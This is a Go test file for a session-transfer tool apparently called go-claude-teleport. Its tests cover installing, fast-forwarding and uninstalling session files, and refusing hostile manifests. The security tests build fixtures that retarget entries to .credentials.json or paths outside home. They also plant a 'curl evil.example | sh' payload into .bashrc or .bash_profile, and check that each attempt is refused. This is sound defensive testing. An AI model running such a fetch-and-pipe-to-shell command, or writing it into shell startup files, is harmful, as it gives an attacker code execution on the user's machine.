package transfer

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mithro/go-claude-teleport/internal/job"
	"github.com/mithro/go-claude-teleport/internal/session"
)

// staged builds two hosts, streams everything into staging and returns the
// dest Paths (config dir = <destHome>/.claude).
func staged(t *testing.T) (*Manifest, string, session.Paths) {
	t.Helper()
	m, staging := newTwoHosts(t)
	st, _ := Diff(context.Background(), m, staging)
	var buf bytes.Buffer
	if err := Send(context.Background(), m, Need(m, st), &buf, nil); err != nil {
		t.Fatal(err)
	}
	if err := Receive(context.Background(), m, &buf, staging, nil); err != nil {
		t.Fatal(err)
	}
	cfg := m.Entries[0].Dst
	for filepath.Base(cfg) != ".claude" {
		cfg = filepath.Dir(cfg)
	}
	home := filepath.Dir(cfg)
	p := session.Paths{Home: home, ConfigDir: cfg, GlobalJSON: filepath.Join(home, ".claude.json"), DataDir: filepath.Join(home, ".local", "share", "claude-teleport")}
	return m, staging, p
}

func TestInstallFreshDestination(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging)
	extra := InstallExtras{
		IndexEntry:   &session.IndexEntry{SessionID: sid, FullPath: m.Entries[1].Dst, ProjectPath: "/home/bob/work", FirstPrompt: "hello"},
		History:      []json.RawMessage{json.RawMessage(`{"display":"hi","timestamp":1,"project":"/home/bob/work","sessionId":"` + sid + `"}`)},
		ProjectCwd:   "/home/bob/work",
		ProjectEntry: session.ProjectEntry{"hasTrustDialogAccepted": true},
	}
	rep, err := Install(context.Background(), m, st, staging, p, extra)
	if err != nil {
		t.Fatal(err)
	}
	if rep.Installed != 5 || rep.FastForwarded != 0 || rep.SkippedSame != 0 {
		t.Errorf("report = %+v", rep)
	}
	if rep.IndexMerged != 1 || rep.HistoryAdded != 1 || !rep.ProjectEntryAdded {
		t.Errorf("merges = %+v", rep)
	}
	for _, e := range m.Entries {
		fi, err := os.Lstat(e.Dst)
		if err != nil {
			t.Errorf("%s not installed: %v", e.Dst, err)
			continue
		}
		if e.IsRegular() && fi.Mode().Perm() != os.FileMode(e.Mode).Perm() {
			t.Errorf("%s mode %v want %v", e.Dst, fi.Mode().Perm(), os.FileMode(e.Mode).Perm())
		}
		if e.IsRegular() && !fi.ModTime().Equal(e.ModTime) {
			t.Errorf("%s mtime %v want %v", e.Dst, fi.ModTime(), e.ModTime)
		}
	}
	parent, _ := os.Stat(filepath.Dir(m.Entries[3].Dst)) // todos/ created by Install
	if parent.Mode().Perm() != 0o700 {
		t.Errorf("session parent dir mode = %v, want 0700", parent.Mode().Perm())
	}
	if _, err := os.Stat(StagedPath(staging, 1)); !os.IsNotExist(err) {
		t.Errorf("staged copy must be moved, not copied")
	}
	idx, _ := os.ReadFile(filepath.Join(p.ProjectDir("/home/bob/work"), "sessions-index.json"))
	if !strings.Contains(string(idx), sid) {
		t.Errorf("sessions-index.json not merged: %s", idx)
	}
	hist, _ := os.ReadFile(p.HistoryFile())
	if !strings.Contains(string(hist), `"display":"hi"`) {
		t.Errorf("history not appended: %s", hist)
	}
	gj, _ := os.ReadFile(p.GlobalJSON)
	if !strings.Contains(string(gj), `"/home/bob/work"`) {
		t.Errorf("project entry not added: %s", gj)
	}

	// idempotent: a second Install after a fresh Diff is all present-same
	st, _ = Diff(context.Background(), m, staging)
	rep, err = Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err != nil || rep.SkippedSame != 5 || rep.Installed != 0 {
		t.Errorf("second install: rep=%+v err=%v", rep, err)
	}
}

func TestInstallFastForwardOverwritesOnlyPrefix(t *testing.T) {
	m, staging, p := staged(t)
	full, _ := os.ReadFile(StagedPath(staging, 1))
	// Controller ruling 1: the authoritative ff-check for a .jsonl Dst is
	// session.IsRecordPrefix (record-wise, not raw bytes), so the dest copy
	// must end on a record boundary to be a valid ff-candidate — truncate
	// after the first complete JSONL line, not at an arbitrary byte offset.
	nl := bytes.IndexByte(full, '\n')
	if nl < 0 || nl+1 >= len(full) {
		t.Fatalf("fixture transcript has no second record to fast-forward into: %q", full)
	}
	partial := full[:nl+1]
	os.MkdirAll(filepath.Dir(m.Entries[1].Dst), 0o700)
	os.WriteFile(m.Entries[1].Dst, partial, 0o600)
	st, _ := Diff(context.Background(), m, staging)
	if st[1] != FFCandidate {
		t.Fatalf("status = %s", st[1])
	}
	rep, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err != nil {
		t.Fatal(err)
	}
	if rep.FastForwarded != 1 {
		t.Errorf("report = %+v", rep)
	}
	got, _ := os.ReadFile(m.Entries[1].Dst)
	if !bytes.Equal(got, full) {
		t.Errorf("fast-forward did not replace the prefix")
	}
}

func TestInstallRefusesCollision(t *testing.T) {
	m, staging, p := staged(t)
	os.MkdirAll(filepath.Dir(m.Entries[3].Dst), 0o700)
	os.WriteFile(m.Entries[3].Dst, []byte("unrelated"), 0o600)
	st, _ := Diff(context.Background(), m, staging)
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), m.Entries[3].Dst) || !strings.Contains(err.Error(), "present-different") {
		t.Fatalf("err = %v, want refusal naming the path", err)
	}
	got, _ := os.ReadFile(m.Entries[3].Dst)
	if string(got) != "unrelated" {
		t.Errorf("collision file was modified")
	}
	// entries before the collision were installed (idempotent), the rest untouched
	if _, err := os.Stat(m.Entries[1].Dst); err != nil {
		t.Errorf("entry 1 should have been installed before the stop: %v", err)
	}
	if _, err := os.Lstat(m.Entries[4].Dst); !os.IsNotExist(err) {
		t.Errorf("entry 4 must not be installed after the stop")
	}
}

func TestInstallRefusesNotStaged(t *testing.T) {
	m, staging, p := staged(t)
	os.Remove(StagedPath(staging, 2))
	st, _ := Diff(context.Background(), m, staging)
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), "absent") {
		t.Fatalf("err = %v, want absent refusal", err)
	}
}

func TestInstallMemoryCopyIfAbsent(t *testing.T) {
	m, staging, p := staged(t)
	memSrc := filepath.Join(t.TempDir(), "memory.md")
	os.WriteFile(memSrc, []byte("# notes\n"), 0o600)
	memDst := filepath.Join(p.ConfigDir, "projects", "-home-bob-work", "memory", "MEMORY.md")
	mem := Entry{ID: 5, Category: session.CatSession, Src: memSrc, Dst: memDst, Size: 8, Mode: 0o600, SHA256: sha("# notes\n")}
	m.Entries = append(m.Entries, mem)
	writeFile(t, StagedPath(staging, 5), "# notes\n")
	st, _ := Diff(context.Background(), m, staging)
	rep, err := Install(context.Background(), m, st, staging, p, InstallExtras{Memory: []Entry{mem}})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.MemoryCopied) != 1 || rep.MemoryCopied[0] != memDst {
		t.Errorf("MemoryCopied = %v", rep.MemoryCopied)
	}
	// second run with different dest content: reported, not overwritten
	os.WriteFile(memDst, []byte("# edited locally\n"), 0o600)
	writeFile(t, StagedPath(staging, 5), "# notes\n")
	st, _ = Diff(context.Background(), m, staging)
	rep, err = Install(context.Background(), m, st, staging, p, InstallExtras{Memory: []Entry{mem}})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.MemoryDiffers) != 1 || rep.MemoryDiffers[0] != memDst {
		t.Errorf("MemoryDiffers = %v", rep.MemoryDiffers)
	}
	got, _ := os.ReadFile(memDst)
	if string(got) != "# edited locally\n" {
		t.Errorf("memory file overwritten")
	}
}

func TestInstallRefusesMemoryEntryWithMismatchedID(t *testing.T) {
	m, staging, p := staged(t)
	memSrc := filepath.Join(t.TempDir(), "memory.md")
	os.WriteFile(memSrc, []byte("# notes\n"), 0o600)
	memDst := filepath.Join(p.ConfigDir, "projects", "-home-bob-work", "memory", "MEMORY.md")
	mem := Entry{ID: 5, Category: session.CatSession, Src: memSrc, Dst: memDst, Size: 8, Mode: 0o600, SHA256: sha("# notes\n")}
	m.Entries = append(m.Entries, mem)
	writeFile(t, StagedPath(staging, 5), "# notes\n")
	st, _ := Diff(context.Background(), m, staging)

	// The Dst does not match manifest entry ID 5 (foreign/hand-built Entry
	// reusing an unrelated ID) — Install must refuse before touching disk.
	foreign := Entry{ID: 5, Category: session.CatSession, Src: memSrc, Dst: memDst + ".evil", Size: 8, Mode: 0o600, SHA256: sha("# notes\n")}
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{Memory: []Entry{foreign}})
	if err == nil || !strings.Contains(err.Error(), "not a manifest entry") {
		t.Fatalf("err = %v, want refusal naming the mismatched memory entry", err)
	}
	if _, err := os.Stat(memDst); !os.IsNotExist(err) {
		t.Errorf("mismatched memory entry must not be installed")
	}

	// An ID that does not exist in the manifest at all is refused too.
	unknown := Entry{ID: 999, Category: session.CatSession, Src: memSrc, Dst: memDst, Size: 8, Mode: 0o600, SHA256: sha("# notes\n")}
	_, err = Install(context.Background(), m, st, staging, p, InstallExtras{Memory: []Entry{unknown}})
	if err == nil || !strings.Contains(err.Error(), "not a manifest entry") {
		t.Fatalf("err = %v, want refusal for unknown memory id", err)
	}
}

// TestInstallRefusesSmuggledCredentialsDst covers the defense-in-depth
// destination re-check (controller item 5): even though a well-behaved
// Build never emits a manifest entry inside session.Forbidden, Install must
// independently refuse one anyway — e.g. a manifest that smuggles a session
// entry's Dst into <ConfigDir>/.credentials.json — before touching disk.
func TestInstallRefusesSmuggledCredentialsDst(t *testing.T) {
	m, staging, p := staged(t)
	victim := 1 // the transcript entry: a plain session-category file
	if m.Entries[victim].Category != session.CatSession || m.Entries[victim].IsDir() {
		t.Fatalf("fixture entry %d is not a plain session file: %+v", victim, m.Entries[victim])
	}
	credPath := filepath.Join(p.ConfigDir, ".credentials.json")
	m.Entries[victim].Dst = credPath
	st, _ := Diff(context.Background(), m, staging)
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), "forbidden") || !strings.Contains(err.Error(), credPath) {
		t.Fatalf("err = %v, want a forbidden-path refusal naming %s", err, credPath)
	}
	if _, statErr := os.Stat(credPath); !os.IsNotExist(statErr) {
		t.Errorf(".credentials.json must not have been written")
	}
	for i, e := range m.Entries {
		if i == victim || e.IsDir() {
			continue
		}
		if _, err := os.Lstat(e.Dst); err == nil {
			t.Errorf("entry %d (%s) must not have been installed before the smuggled entry was rejected", i, e.Dst)
		}
	}
}

// TestInstallRefusesDstOutsideHome covers the second half of the same
// defense-in-depth check: a Dst that lexically escapes p.Home altogether
// (any category, not just session) is refused before touching disk.
func TestInstallRefusesDstOutsideHome(t *testing.T) {
	m, staging, p := staged(t)
	victim := 3 // the todos/<sid>.json entry
	if m.Entries[victim].IsDir() {
		t.Fatalf("fixture entry %d is a dir, want a plain file", victim)
	}
	outside := filepath.Join(filepath.Dir(p.Home), "evil-outside", "payload.txt")
	m.Entries[victim].Dst = outside
	st, _ := Diff(context.Background(), m, staging)
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), "not under home") || !strings.Contains(err.Error(), outside) {
		t.Fatalf("err = %v, want a not-under-home refusal naming %s", err, outside)
	}
	if _, statErr := os.Stat(outside); !os.IsNotExist(statErr) {
		t.Errorf("payload must not have been written outside home")
	}
}

// TestUninstallRefusesSmuggledCredentialsDst mirrors the Install case for
// Uninstall: a manifest entry whose Dst has been retargeted at
// <ConfigDir>/.credentials.json (with a matching hash, so nothing else
// would stop the removal) must be refused before anything is deleted —
// including the OTHER, legitimate entries the same manifest lists.
func TestUninstallRefusesSmuggledCredentialsDst(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging)
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatal(err)
	}
	credPath := filepath.Join(p.ConfigDir, ".credentials.json")
	os.WriteFile(credPath, []byte("super-secret"), 0o600)
	sum, _, err := HashFile(credPath)
	if err != nil {
		t.Fatal(err)
	}
	victim := 1
	m.Entries[victim].Dst = credPath
	m.Entries[victim].SHA256 = sum

	removed, err := Uninstall(m, p)
	if err == nil || !strings.Contains(err.Error(), "forbidden") || !strings.Contains(err.Error(), credPath) {
		t.Fatalf("err = %v removed = %v, want a forbidden-path refusal naming %s", err, removed, credPath)
	}
	if removed != nil {
		t.Errorf("nothing should have been removed: %v", removed)
	}
	if got, err := os.ReadFile(credPath); err != nil || string(got) != "super-secret" {
		t.Errorf(".credentials.json must survive untouched: %q err=%v", got, err)
	}
	for i, e := range m.Entries {
		if i == victim || e.IsDir() {
			continue
		}
		if _, err := os.Lstat(e.Dst); err != nil {
			t.Errorf("entry %d (%s) must not have been removed either: %v", i, e.Dst, err)
		}
	}
}

// TestUninstallRefusesDstOutsideHome mirrors the Install case: a manifest
// entry whose Dst lexically escapes p.Home is refused before any deletion.
func TestUninstallRefusesDstOutsideHome(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging)
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatal(err)
	}
	outside := filepath.Join(t.TempDir(), "payload.txt")
	if err := os.WriteFile(outside, []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	sum, _, err := HashFile(outside)
	if err != nil {
		t.Fatal(err)
	}
	victim := 3
	m.Entries[victim].Dst = outside
	m.Entries[victim].SHA256 = sum

	removed, err := Uninstall(m, p)
	if err == nil || !strings.Contains(err.Error(), "not under home") || !strings.Contains(err.Error(), outside) {
		t.Fatalf("err = %v removed = %v, want a not-under-home refusal naming %s", err, removed, outside)
	}
	if removed != nil {
		t.Errorf("nothing should have been removed: %v", removed)
	}
	if _, err := os.Stat(outside); err != nil {
		t.Errorf("payload outside home must survive untouched: %v", err)
	}
}

func TestUninstallRemovesOnlyMatching(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging)
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(m.Entries[3].Dst, []byte("changed after install"), 0o600)
	removed, err := Uninstall(m, p)
	if err != nil {
		t.Fatal(err)
	}
	for _, r := range removed {
		if r == m.Entries[3].Dst {
			t.Errorf("modified file must not be removed")
		}
	}
	if _, err := os.Stat(m.Entries[3].Dst); err != nil {
		t.Errorf("modified file gone")
	}
	if _, err := os.Stat(m.Entries[1].Dst); !os.IsNotExist(err) {
		t.Errorf("matching transcript should be removed")
	}
	if _, err := os.Lstat(m.Entries[4].Dst); !os.IsNotExist(err) {
		t.Errorf("symlink should be removed")
	}
	if _, err := os.Stat(m.Entries[0].Dst); !os.IsNotExist(err) {
		t.Errorf("emptied project dir should be removed")
	}
}

// TestUninstallIDsOnlyNamedEntries covers Task 23 (abandon's
// destination-side deletion): UninstallIDs must restrict deletion to the
// given ids even when another, unnamed entry's current content also still
// matches the manifest hash.
func TestUninstallIDsOnlyNamedEntries(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging)
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatal(err)
	}
	removed, err := UninstallIDs(m, p, []int{m.Entries[1].ID})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(m.Entries[1].Dst); !os.IsNotExist(err) {
		t.Errorf("named entry should be removed")
	}
	if _, err := os.Stat(m.Entries[3].Dst); err != nil {
		t.Errorf("entry not named in ids must survive: %v", err)
	}
	for _, r := range removed {
		if r == m.Entries[3].Dst {
			t.Errorf("unnamed entry must not be reported removed")
		}
	}
}

// TestUninstallIDsNeverRemovesDirNotInIDs is folded minor M1: a directory
// entry is a cleanup candidate only when its OWN id is in ids (i.e. the
// job itself created it) — never merely because every file under it also
// happened to be named. Here every non-dir entry is named, emptying the
// project directory, but its own id (0) is not — it must survive.
func TestUninstallIDsNeverRemovesDirNotInIDs(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging)
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatal(err)
	}
	var ids []int
	for _, e := range m.Entries {
		if !e.IsDir() {
			ids = append(ids, e.ID)
		}
	}
	if _, err := UninstallIDs(m, p, ids); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(m.Entries[0].Dst); err != nil {
		t.Errorf("directory whose id is not in ids must survive even once empty: %v", err)
	}
}

// TestUninstallRemovesEmptiedNestedDirs covers controller ruling 2: a
// manifest whose dir entries include a nested "<sid>/subagents/" tree must
// leave no empty directories behind once every file under it is removed —
// Uninstall has to walk the manifest's dir entries deepest-first, not just
// the top-level project dir.
func TestUninstallRemovesEmptiedNestedDirs(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging)
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatal(err)
	}
	// entry 2 is proj/<sid>/subagents/agent-1.jsonl; its parent dirs
	// (proj/<sid>/subagents and proj/<sid>) are not manifest dir entries
	// themselves, but the sidecar structure must not leave empties behind
	// when everything manifest-listed under proj/ is removed.
	sidecarSubagents := filepath.Dir(m.Entries[2].Dst)
	sidecarDir := filepath.Dir(sidecarSubagents)
	if _, err := os.Stat(sidecarSubagents); err != nil {
		t.Fatalf("fixture missing sidecar subagents dir: %v", err)
	}
	removed, err := Uninstall(m, p)
	if err != nil {
		t.Fatalf("removed=%v err=%v", removed, err)
	}
	if _, err := os.Stat(m.Entries[0].Dst); !os.IsNotExist(err) {
		t.Errorf("project dir (manifest entry 0) should be removed, leaving no empty tree: %v", err)
	}
	if _, err := os.Stat(sidecarDir); !os.IsNotExist(err) {
		t.Errorf("sidecar dir left behind: %v", err)
	}
}

// TestInstallRefusesSmuggledDeferredEntry is the Install half of B1: even
// with a status map that says staged-same (a compromised source could get
// there via a peer whose Diff is older, or simply by a bug), Install must
// refuse to place a Deferred entry whose category is not the pane capture
// — the only Deferred category the plain file-install path ever handles —
// before anything at all is touched. Since R-P3-B1c, a CatPack entry (used
// here, as the original B1 pin) is additionally refused at the
// category level by validateDst itself, regardless of Deferred — see
// TestInstallRefusesPackEntryEvenWithHostileStatusMap for that check
// pinned directly (including the absent-target PoC case this test does not
// cover); Deferred:true is kept here only as an unrelated regression check
// that the two refusals do not interfere with each other.
func TestInstallRefusesSmuggledDeferredEntry(t *testing.T) {
	m, staging, p := staged(t)
	victim := 2 // a plain session-category file
	if !m.Entries[victim].IsRegular() {
		t.Fatalf("fixture entry %d is not a plain file: %+v", victim, m.Entries[victim])
	}
	if err := os.MkdirAll(p.Home, 0o700); err != nil {
		t.Fatal(err)
	}
	bashrc := filepath.Join(p.Home, ".bashrc")
	rc := "# the user's own shell rc\n"
	if err := os.WriteFile(bashrc, []byte(rc), 0o600); err != nil {
		t.Fatal(err)
	}
	m.Entries[victim].Category = session.CatPack
	m.Entries[victim].Dst = bashrc
	m.Entries[victim].Deferred = true

	// The hostile status map the destination must not trust.
	st := map[int]Status{}
	for _, e := range m.Entries {
		st[e.ID] = StagedSame
	}
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), "pack") || !strings.Contains(err.Error(), bashrc) {
		t.Fatalf("err = %v, want a pack-entry refusal naming %s", err, bashrc)
	}
	if got, _ := os.ReadFile(bashrc); string(got) != rc {
		t.Errorf("%s was modified: %q", bashrc, got)
	}
	for i, e := range m.Entries {
		if i == victim || e.IsDir() {
			continue
		}
		if _, err := os.Lstat(e.Dst); err == nil {
			t.Errorf("entry %d (%s) must not have been installed before the smuggled entry was rejected", i, e.Dst)
		}
	}
}

// TestInstallForceOverwritesDivergedSessionFile covers B12. Spec §7.3:
// --force extends the fast-forward exception to the NON-prefix case, for
// the same session id only. Diff classifies such an entry
// present-different; Blocking(force=true) lets it through and Pending
// reports nothing outstanding, so preflight and the transfer step both say
// "go" — but Install's switch had no present-different arm and failed the
// whole job at step 8. It must overwrite instead, from a hash-verified
// staged copy, and only with the caller's explicit consent.
func TestInstallForceOverwritesDivergedSessionFile(t *testing.T) {
	setup := func(t *testing.T) (*Manifest, string, session.Paths, map[int]Status, []byte) {
		t.Helper()
		m, staging, p := staged(t)
		full, err := os.ReadFile(StagedPath(staging, 1))
		if err != nil {
			t.Fatal(err)
		}
		if !m.Entries[1].FFAllowed {
			t.Fatalf("fixture entry 1 is not a session file: %+v", m.Entries[1])
		}
		// A diverged transcript: same session, but NOT a prefix of the
		// incoming one, so no fast-forward is possible.
		os.MkdirAll(filepath.Dir(m.Entries[1].Dst), 0o700)
		if err := os.WriteFile(m.Entries[1].Dst, []byte(`{"type":"user","text":"a different branch of history"}`+"\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		st, err := Diff(context.Background(), m, staging)
		if err != nil {
			t.Fatal(err)
		}
		if st[1] != PresentDifferent {
			t.Fatalf("status = %s, want %s", st[1], PresentDifferent)
		}
		if b := Blocking(m, st, true); len(b) != 0 {
			t.Fatalf("Blocking(force) = %+v, want nothing (this is the case --force allows)", b)
		}
		if ids := Pending(m, st); len(ids) != 0 {
			t.Fatalf("Pending = %v, want nothing outstanding", ids)
		}
		return m, staging, p, st, full
	}

	t.Run("with force", func(t *testing.T) {
		m, staging, p, st, full := setup(t)
		rep, err := Install(context.Background(), m, st, staging, p, InstallExtras{Force: true})
		if err != nil {
			t.Fatalf("Install: %v", err)
		}
		if rep.ForceOverwritten != 1 {
			t.Errorf("report = %+v, want ForceOverwritten 1", rep)
		}
		got, _ := os.ReadFile(m.Entries[1].Dst)
		if !bytes.Equal(got, full) {
			t.Errorf("destination not overwritten with the incoming copy")
		}
		for _, id := range rep.InstalledIDs {
			if id == 1 {
				t.Errorf("a force-overwritten entry pre-existed on the destination and must not be in InstalledIDs")
			}
		}
	})

	t.Run("without force", func(t *testing.T) {
		m, staging, p, st, _ := setup(t)
		_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
		if err == nil || !strings.Contains(err.Error(), "present-different") {
			t.Fatalf("err = %v, want a refusal naming the status", err)
		}
	})

	t.Run("force does not extend to another session's file", func(t *testing.T) {
		m, staging, p, st, _ := setup(t)
		// FFAllowed is a SOURCE-computed field; the destination must
		// re-derive session ownership from Dst itself.
		m.SessionID = "00000000-0000-4000-8000-000000000000"
		_, err := Install(context.Background(), m, st, staging, p, InstallExtras{Force: true})
		if err == nil || !strings.Contains(err.Error(), m.Entries[1].Dst) {
			t.Fatalf("err = %v, want a refusal naming %s", err, m.Entries[1].Dst)
		}
	})
}

// TestInstallRefusesSmuggledCaptureDst is the full end-to-end PoC for
// ruling R-P3-B1b (the wave B re-review's residual B1 finding): a hostile
// or buggy source builds a manifest with a Deferred CatCapture entry whose
// Dst is ~/.bashrc, staging attacker-controlled bytes under that entry's
// id. Before this fix, Diff's Deferred branch skipped the Lstat of Dst
// entirely (classifying staged-same) and Install's "only capture may be
// deferred" gate let CatCapture straight through, so placeEntry renamed the
// staged bytes over ~/.bashrc. The destination now re-derives the ONE
// legitimate capture Dst for this job — job.Dir(DataDir, jobID)/capture.txt
// — and refuses anything else in both Diff and Install, leaving ~/.bashrc
// byte-identical and naming the offending entry in the error.
func TestInstallRefusesSmuggledCaptureDst(t *testing.T) {
	home := t.TempDir()
	if err := os.MkdirAll(home, 0o700); err != nil {
		t.Fatal(err)
	}
	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
	p := session.Paths{
		Home:       home,
		ConfigDir:  filepath.Join(home, ".claude"),
		GlobalJSON: filepath.Join(home, ".claude.json"),
		DataDir:    dataDir,
	}
	jobID := "22222222-2222-4222-8222-222222222222"
	staging := job.StagingDir(dataDir, jobID)

	bashrc := filepath.Join(home, ".bashrc")
	rc := "# the user's own shell rc\n"
	if err := os.WriteFile(bashrc, []byte(rc), 0o600); err != nil {
		t.Fatal(err)
	}
	payload := "curl evil.example | sh\n"

	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
	m.Entries = []Entry{{
		ID: 0, Category: session.CatCapture, Dst: bashrc,
		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload), Deferred: true,
	}}
	writeFile(t, StagedPath(staging, 0), payload)

	st, err := Diff(context.Background(), m, staging)
	if err != nil {
		t.Fatal(err)
	}
	if st[0] != PresentDifferent {
		t.Fatalf("Diff classified the smuggled capture entry %s, want %s", st[0], PresentDifferent)
	}

	_, err = Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), bashrc) {
		t.Fatalf("Install err = %v, want a refusal naming %s", err, bashrc)
	}
	got, err := os.ReadFile(bashrc)
	if err != nil || string(got) != rc {
		t.Fatalf("%s must survive byte-identical: got %q err=%v", bashrc, got, err)
	}
}

// TestInstallRefusesCaptureDstEvenWithHostileStatusMap is Install's own
// independent half of the same defense (mirrors
// TestInstallRefusesSmuggledDeferredEntry): even a hostile status map that
// claims staged-same for every entry — bypassing Diff's own refusal
// entirely — must not get a CatCapture entry with a non-canonical Dst
// installed. Covered for both Deferred and non-Deferred entries: the
// canonical-Dst check in validateDst does not depend on the flag.
func TestInstallRefusesCaptureDstEvenWithHostileStatusMap(t *testing.T) {
	for _, deferred := range []bool{true, false} {
		t.Run(map[bool]string{true: "deferred", false: "not deferred"}[deferred], func(t *testing.T) {
			m, staging, p := staged(t)
			victim := 2 // a plain session-category file, repurposed as the attack entry
			if !m.Entries[victim].IsRegular() {
				t.Fatalf("fixture entry %d is not a plain file: %+v", victim, m.Entries[victim])
			}
			if err := os.MkdirAll(p.Home, 0o700); err != nil {
				t.Fatal(err)
			}
			bashrc := filepath.Join(p.Home, ".bashrc")
			rc := "# the user's own shell rc\n"
			if err := os.WriteFile(bashrc, []byte(rc), 0o600); err != nil {
				t.Fatal(err)
			}
			m.Entries[victim].Category = session.CatCapture
			m.Entries[victim].Dst = bashrc
			m.Entries[victim].Deferred = deferred

			st := map[int]Status{}
			for _, e := range m.Entries {
				st[e.ID] = StagedSame
			}
			_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
			if err == nil || !strings.Contains(err.Error(), bashrc) || !strings.Contains(err.Error(), "capture") {
				t.Fatalf("err = %v, want a capture-entry refusal naming %s", err, bashrc)
			}
			got, _ := os.ReadFile(bashrc)
			if string(got) != rc {
				t.Errorf("%s was modified: %q", bashrc, got)
			}
		})
	}
}

// TestInstallInstallsCanonicalCaptureEntry proves the fix does not break
// the legitimate flow end-to-end: a manifest whose CatCapture entry's Dst
// IS job.Dir(DataDir, jobID)/capture.txt installs normally via Diff+Install
// (the plain file-install path, judged only against staging, per Entry's
// own doc comment).
func TestInstallInstallsCanonicalCaptureEntry(t *testing.T) {
	home := t.TempDir()
	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
	p := session.Paths{
		Home:       home,
		ConfigDir:  filepath.Join(home, ".claude"),
		GlobalJSON: filepath.Join(home, ".claude.json"),
		DataDir:    dataDir,
	}
	jobID := "44444444-4444-4444-8444-444444444444"
	staging := job.StagingDir(dataDir, jobID)
	capDst := filepath.Join(job.Dir(dataDir, jobID), "capture.txt")
	payload := "$ claude\n> hello\n"

	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
	m.Entries = []Entry{{
		ID: 0, Category: session.CatCapture, Dst: capDst,
		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload), Deferred: true,
	}}
	writeFile(t, StagedPath(staging, 0), payload)

	st, err := Diff(context.Background(), m, staging)
	if err != nil {
		t.Fatal(err)
	}
	if st[0] != StagedSame {
		t.Fatalf("status = %s, want %s", st[0], StagedSame)
	}
	rep, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err != nil {
		t.Fatalf("Install: %v", err)
	}
	if rep.Installed != 1 {
		t.Errorf("report = %+v, want Installed 1", rep)
	}
	got, err := os.ReadFile(capDst)
	if err != nil || string(got) != payload {
		t.Fatalf("capture.txt not installed correctly: got %q err=%v", got, err)
	}
}

// TestInstallRefusesPackEntryAbsentTargetPoC is the wave-B re-review's PoC
// for ruling R-P3-B1c, run end to end through the real Diff()+Install()
// pair a production caller (internal/remote/local.go) actually uses: a
// manifest entry with category "pack" and Dst $HOME/.bash_profile — a path
// that does not exist yet on the destination — with attacker-chosen bytes
// staged under its id. Before this fix, Diff's ordinary "absent" branch
// classified it staged-same purely from staging state (no category check,
// no Lstat-based collision to catch it, since there is nothing to collide
// with), and Install's placeEntry created the file, landing arbitrary
// attacker content at a path a real login shell sources (the reviewer's
// code-exec-on-next-login finding). No FileEntry in this codebase is ever
// built with category "pack" (BuildManifest/gitx.Files never emit one; the
// git pack itself is the separate StreamPack, consumed straight into
// gitx.Attach), so it must be refused unconditionally and nothing may be
// created at Dst.
func TestInstallRefusesPackEntryAbsentTargetPoC(t *testing.T) {
	home := t.TempDir()
	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
	p := session.Paths{
		Home:       home,
		ConfigDir:  filepath.Join(home, ".claude"),
		GlobalJSON: filepath.Join(home, ".claude.json"),
		DataDir:    dataDir,
	}
	jobID := "33333333-3333-4333-8333-333333333333"
	staging := job.StagingDir(dataDir, jobID)
	target := filepath.Join(home, ".bash_profile") // absent: never written before this call
	payload := "curl evil.example | sh\n"

	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
	m.Entries = []Entry{{
		ID: 0, Category: session.CatPack, Dst: target,
		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload),
	}}
	writeFile(t, StagedPath(staging, 0), payload)

	st, err := Diff(context.Background(), m, staging)
	if err != nil {
		t.Fatal(err)
	}
	if st[0] != PresentDifferent {
		t.Fatalf("Diff classified the pack entry %s, want %s", st[0], PresentDifferent)
	}
	_, err = Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), target) {
		t.Fatalf("Install err = %v, want a refusal naming %s", err, target)
	}
